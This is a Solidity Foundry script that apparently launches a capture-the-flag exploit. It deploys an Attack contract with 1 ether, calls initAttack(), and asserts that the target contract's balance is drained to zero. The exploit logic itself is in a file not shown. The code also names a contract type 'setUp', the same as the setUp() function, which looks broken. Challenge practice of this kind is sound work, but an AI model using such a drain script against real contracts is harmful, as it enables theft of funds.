// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

// Importing required modules and contracts from the forge-std library and local sources.
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./src/Challenge.sol";
import "./src/Setup.sol";
import "./src/Attack.sol";


contract ExploitScript is Script {
    // Address of the setup contract, which initializes the target for the exploit.
    setUp private setupContract;

    // Instance of the Attack contract.
    Attack private att;
    
    /**
     * @dev Set up environment for the exploit. This function can be used to initialize
     *      variables or state before executing the main exploit logic in `run()`.
     */
    function setUp() public {
        setupContract = new setUp();
    }

    /**
     * @dev Main function to execute the attack. It deploys the Attack contract and initiates
     *      the attack sequence. It also includes assertions to check the success of the attack.
     */
    function run() public {
        // Start broadcasting transactions to the network.
        vm.startBroadcast();

        // Retrieve the target address from the setup contract.
        address target = address(setupContract.TARGET());

        // Deploy the Attack contract with 1 ether to fund the attack.
        att = new Attack{value: 1 ether}(target);

        // Initiate the attack.
        att.initAttack();

        // Assert that the target's balance is reduced to 0, indicating a successful exploit.
        assert(target.balance == 0);

        // Stop broadcasting transactions.
        vm.stopBroadcast();
    }
}
